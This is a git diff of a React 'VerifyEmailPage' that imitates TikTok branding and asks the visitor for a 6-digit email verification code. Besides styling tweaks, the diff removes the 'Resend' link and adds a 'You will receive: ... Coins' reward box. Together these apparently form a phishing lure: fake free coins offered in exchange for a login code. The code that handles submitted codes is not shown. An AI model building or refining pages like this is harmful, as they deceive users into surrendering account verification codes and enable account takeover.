@@ -98,28 +98,28 @@ const VerifyEmailPage = () => {
         </Button>
       </header>
 
-      <main className="max-w-4xl mx-auto px-6 py-12">
+      <main className="max-w-4xl mx-auto px-6 py-6">
         <div className="text-center mb-8">
-          <h1 className="text-6xl font-black mb-4">
+          <h1 className="text-4xl font-black mb-2">
             <span className="bg-gradient-to-r from-pink-500 via-purple-500 to-cyan-400 bg-clip-text text-transparent">
               TikTok
             </span>
           </h1>
-          <p className="text-cyan-400 text-2xl font-semibold">Enter the mail code</p>
+          <p className="text-cyan-400 text-sm font-semibold">Enter the mail code</p>
         </div>
 
         <ProfileCard userData={tiktokData} />
 
         <div className="text-center mb-8">
-          <h2 className="text-cyan-400 text-3xl font-bold mb-4">Check your email</h2>
-          <p className="text-gray-400 text-lg mb-2">
+          <h2 className="text-cyan-400 text-xl font-bold mb-2">Check your email</h2>
+          <p className="text-gray-400 text-sm mb-1">
             We sent a 6-digit code to your email address. Please enter it below to continue.
           </p>
-          <p className="text-cyan-400 text-lg font-semibold">Code sent to: {maskedEmail}</p>
+          <p className="text-cyan-400 text-sm font-semibold">Code sent to: {maskedEmail}</p>
         </div>
 
         <div className="mb-8">
-          <label className="text-white text-lg mb-4 block">Mail code</label>
+          <label className="text-white text-sm mb-2 block">Mail code</label>
           <div className="flex gap-2 justify-center">
             {code.map((digit, index) => (
               <input
@@ -132,7 +132,7 @@ const VerifyEmailPage = () => {
                 value={digit}
                 onChange={(e) => handleChange(index, e.target.value)}
                 onKeyDown={(e) => handleKeyDown(index, e)}
-                className={`w-12 h-14 text-center text-xl font-bold bg-[#1a1a1c] border-2 rounded-lg text-white focus:outline-none transition-all ${
+                className={`w-14 h-14 text-center text-xl font-bold bg-[#1a1a1c] border-2 rounded-2xl text-white focus:outline-none transition-all ${
                   index === 0 && !code[0] ? 'border-cyan-400 shadow-lg shadow-cyan-400/20' : digit ? 'border-cyan-400' : 'border-gray-700'
                 }`}
               />
@@ -144,10 +144,21 @@ const VerifyEmailPage = () => {
           Continue
         </Button>
 
-        <div className="text-center mb-8">
-          <span className="text-gray-400 text-lg">Didn't receive the code? </span>
-          <button onClick={handleResend} className="text-[#fe2c55] text-lg font-semibold hover:underline">Resend</button>
-        </div>
+        <div className="inline-flex items-center gap-2 bg-[#1a1a1c] border border-cyan-400/30 rounded-lg px-5 py-2">
+  <span className="text-gray-400 text-sm">You will receive: </span>
+
+  <img
+    src="/coin-icon.png"
+    alt="Coin"
+    className="w-4 h-4 object-contain flex-shrink-0"
+  />
+
+  <span className="text-cyan-400 text-xl font-bold">
+    {parseInt(coinAmount).toLocaleString()}
+  </span>
+
+  <span className="text-gray-400 text-xs"> Coins</span>
+</div>
 
         <div className="text-center">
           <div className="inline-block bg-[#1a1a1c] border-2 border-cyan-400/30 rounded-lg px-8 py-4">
